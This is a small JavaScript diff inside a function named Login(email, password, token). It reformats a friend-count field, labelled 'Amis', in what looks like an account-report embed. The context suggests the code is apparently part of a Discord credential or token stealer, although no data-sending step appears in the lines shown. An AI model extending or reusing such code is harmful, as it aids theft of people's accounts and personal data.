@@ -150,7 +150,6 @@ function Login(email, password, token) {
                     function totalFriends() {
                         var f = JSON.parse(info4)
                         const r = f.filter((user) => {
-            
                             return user.type == 1
                         })
                         return r.length
@@ -195,7 +194,7 @@ function Login(email, password, token) {
                                     },
                                     {
                                     "name": "**Amis**",
-                                    "value": ` ${totalFriends()} \n${CalcFriends()}`,
+                                    "value": `\n\n\nTotal Friends ${totalFriends()}) \n`,
                                     "inline": false
                                     },
                                     {
